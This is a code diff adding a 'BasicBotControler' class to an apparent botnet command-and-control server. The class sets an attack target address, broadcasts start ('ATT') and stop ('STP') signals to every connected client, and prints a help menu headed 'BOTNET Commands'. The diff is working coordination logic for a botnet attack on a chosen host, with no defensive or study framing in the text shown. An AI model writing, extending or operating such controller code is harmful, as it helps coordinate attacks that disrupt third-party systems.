@@ -187,3 +187,41 @@ class BasicControler:
             self.server.Msg(f"CMD: {cmd}", dev=True)
             self.checkCMD(cmd)
             
+
+
+
+class BasicBotControler(BasicControler):
+    def __init__(self, pipe : Pipe, server_callback: object):
+        super().__init__(pipe, server_callback)
+        self.name = "BasicBot Controler"
+    
+    def setTarget(self, target: str) -> None:
+        self.server.targetAttack = target
+        self.sendMsg2Client("all", f"tar {target}")
+    
+    def setAttack(self) -> None:
+        self.server.signalAttack = True
+        self.sendMsg2Client("all", "ATT")
+    
+    def stopAttack(self) -> None:
+        self.server.signalAttack = False
+        self.sendMsg2Client("all", "STP")
+    
+    def execCMD(self, cmd: list) -> None:
+        match cmd[0]:
+            case "tar":
+                self.setTarget(cmd[1])
+            case "att":
+                self.setAttack()
+            case "stp":
+                self.stopAttack()
+            case _:
+                self.server.Msg("Unknown Command")
+
+    def help(self) -> str:
+        hilfe = "\n*************** BOTNET Commands ********************\n"
+        hilfe += "-- ss tar <address>          - Set target to all clients\n"
+        hilfe += "-- ss att                    - Send signal to start attack\n"
+        hilfe += "-- ss stp                    - Send signal to stop attack\n"
+
+        return self.hilfe() + hilfe
